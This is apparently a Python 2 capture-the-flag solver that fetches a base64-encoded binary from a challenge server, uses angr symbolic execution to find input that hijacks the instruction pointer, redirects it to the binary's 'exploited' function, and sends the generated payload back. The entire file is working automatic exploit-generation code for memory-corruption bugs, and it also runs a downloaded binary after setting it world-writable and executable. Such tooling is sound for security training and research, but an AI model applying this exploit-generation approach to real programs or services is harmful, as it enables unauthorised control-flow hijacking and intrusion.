#-*- coding: utf-8 -*-

import sys, os, angr, logging
from angr import sim_options as so
from pwn import *

server = "192.168.0.3"
port = 20100

def check_symbolic(state, length):
	# get all the symbolic bytes from STDIN
	stdin = state.posix.get_file(0)

	sym_addrs = []
	for var in stdin.variables():
		sym_addrs.extend(state.memory.addrs_for_name(var))

	for addr in sym_addrs:
		is_sym_addr = True

		for i in range(length):
			if not addr + i in sym_addrs:
				is_sym_addr = False
				break

		if is_sym_addr:
			yield addr

def main():

	r = remote(server, port)
	print r.recv()
	print r.recv()

	recv = r.recvuntil("\n\n").replace("\n","").decode("base64")
	with open("./test", "wb") as fd:
		fd.write(recv)

	os.system("chmod 777 ./test")

	target = "./test"

	# set default project options
	p = angr.Project(target, auto_load_libs=False)
	
	opts = {so.REVERSE_MEMORY_NAME_MAP, so.TRACK_ACTION_HISTORY}
	es = p.factory.entry_state(add_options=opts)
	sm = p.factory.simgr(es, save_unconstrained=True)

	# get exploited function address
	fn_exploited = p.loader.find_symbol("exploited").linked_addr
	print "[*] exploited function : ", hex(fn_exploited)
	
	ex_state = None
	while ex_state is None:
		sm.step()
		if len(sm.unconstrained) == 0:
			continue

		for u in sm.unconstrained:

			is_symbolic = True

			for i in range(0, u.arch.bits):
				if not u.se.symbolic(u.regs.rip[i]):
					is_symbolic = False
					break

			if is_symbolic:
				ex_state = u

		sm.drop(stash='unconstrained')

	assert ex_state.se.symbolic(ex_state.regs.rip)

	for sym_addr in check_symbolic(ex_state, 8):
		ex_state.add_constraints(ex_state.regs.rip == fn_exploited)

		if ex_state.satisfiable():
			break
		else:
			return -1

	payload = ex_state.posix.dumps(0)

	print "[*] exploit payload"
	print hexdump(payload)

	b64_payload = payload.encode("base64").replace("\n","")

	print "[*] send payload (base64) to server"
	r.sendline(b64_payload)

	print "[*] response from challenge server"
	print r.recv()
	r.close()

if __name__ == '__main__':
	main()

